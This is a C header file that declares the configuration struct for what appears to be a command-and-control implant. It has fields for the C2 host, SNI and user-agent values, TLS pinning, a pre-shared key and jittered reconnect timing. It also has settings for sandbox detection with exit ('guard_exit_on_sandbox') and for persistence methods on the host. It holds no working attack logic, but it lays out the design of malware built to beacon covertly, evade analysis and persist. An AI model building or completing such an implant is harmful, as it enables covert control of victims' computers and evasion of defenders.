#ifndef C2_CONFIG_H
#define C2_CONFIG_H
#include "common.h"

#define C2_MAX_PINS 4
#define C2_PIN_HEX_LEN 64

typedef struct {
    /* transport */
    char host[256];
    int  port;
    char path[128];
    char sni[256];
    char user_agent[128];

    /* TLS pinning: 0 = static pin(s), 1 = TOFU (trust on first use) */
    int  pin_mode;
    char pins[C2_MAX_PINS][C2_PIN_HEX_LEN + 1];
    int  pin_count;
    char pin_store[MAX_PATH * 2];
    int  allow_unpinned;
    char ca_bundle[MAX_PATH * 2];

    /* application layer */
    char psk_b64[256];
    u8   psk[64];
    size_t psk_len;

    /* reconnect / heartbeat */
    int reconnect_min_ms;
    int reconnect_max_ms;
    int reconnect_jitter_pct;
    int heartbeat_ms;
    int connect_timeout_ms;

    /* runtime */
    int  debug_log;
    char log_path[MAX_PATH * 2];
    int  guard_enable;
    int  guard_sleep_ms;
    int  guard_exit_on_sandbox;
    int  persist_enable;
    int  persist_methods;        /* bitmask, see persist.h */
    char persist_name[80];
    char working_dir[MAX_PATH * 2];
    int  single_instance;

    char config_path[MAX_PATH * 2];
    int  loaded;
} config_t;

int  config_load(config_t *cfg, const char *explicit_path);
void config_print_effective(const config_t *cfg); /* logs non-secret effective values */

#endif
